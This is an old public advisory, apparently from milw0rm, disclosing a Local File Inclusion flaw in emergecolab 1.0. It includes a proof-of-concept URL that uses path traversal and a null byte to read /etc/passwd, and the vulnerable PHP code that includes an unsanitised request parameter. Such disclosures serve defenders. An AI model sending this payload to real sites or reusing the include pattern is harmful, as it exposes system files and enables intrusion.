@@ -1,0 +1,51 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ###############################################################
+ #  [ emergecolab 1.0 ]   Local File Inclusion Vulnerability   #
+ ###############################################################
+ #
+ # Script site: http://emerge2004.net/software.php 
+ # Download: http://eduforge.org/projects/emergecolab/
+ #
+ # Vuln:
+ # http://site.com/emerge-1.0/connect/index.php?sitecode=../../../../../../../etc/passwd%00
+ #      
+ #
+ # Bug: ./emerge-1.0/connect/init.inc (lines: 23-30)
+ #
+ # ...
+ # if (isset($_GET["sitecode"])) {
+ # 	#first load the global settings
+ #	include ("conf/global.conf");
+ #	#echo "got get var";
+ #	$_SESSION["sitecode"]=$_GET["sitecode"];
+ #	#set the session variable with the site folder for now just to default
+ #	$_SESSION['sitefolder']='site';
+ #	include ("conf/".strtolower($_GET["sitecode"]).".conf"); 	// LFI
+ # ...
+ #
+ #
+ # Bug: (for example) ./emerge-1.0/connect/index.php (line: 2)
+ #
+ # ...
+ # require ("init.inc");
+ # ...
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-09-24]
